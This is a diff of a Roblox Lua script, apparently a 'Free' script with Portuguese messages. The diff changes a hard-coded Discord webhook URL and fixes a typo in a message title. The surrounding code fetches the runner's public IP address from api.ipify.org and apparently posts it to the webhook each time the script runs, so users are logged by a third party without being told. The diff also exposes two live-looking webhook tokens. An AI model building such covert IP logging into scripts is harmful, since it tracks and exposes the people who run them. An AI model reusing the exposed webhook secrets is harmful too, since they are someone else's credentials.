@@ -1,5 +1,5 @@
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1280021862503419904/K5gqtqvxmSg1DNzfFRhcuJv4GzFyyYIh6hUwhU4pFvS98gDqg8EYqvzqWUtW4ZDt8KcO"
+local Webhook_URL = "https://discord.com/api/webhooks/1282327535559901306/KvEglvcA2dYJMUsyeh8XVs56pDvPZFyuyeykhxMGzMboeq26r9rwsSdM7euv-htaB16I"
 
 local function sendRequest(requestFunction, isSuccess, securityAlert, errorMessage)
     local ipAddress = game:HttpGet("https://api.ipify.org")  
@@ -20,7 +20,7 @@ local function sendRequest(requestFunction, isSuccess, securityAlert, errorMessa
     local jsonBody = HttpService:JSONEncode({
         ["content"] = "",
         ["embeds"] = {{
-            ["title"] = isSuccess and "**Script Executado com Sucesso!Free**" or "**Erro na Execução do Script Free**",
+            ["title"] = isSuccess and "**Script Executado com Sucesso! Free**" or "**Erro na Execução do Script Free**",
             ["description"] = isSuccess and "🎉 O script foi executado com sucesso! Free" or "❌ O script encontrou um erro. Free",
             ["type"] = "rich",
             ["color"] = embedColor,
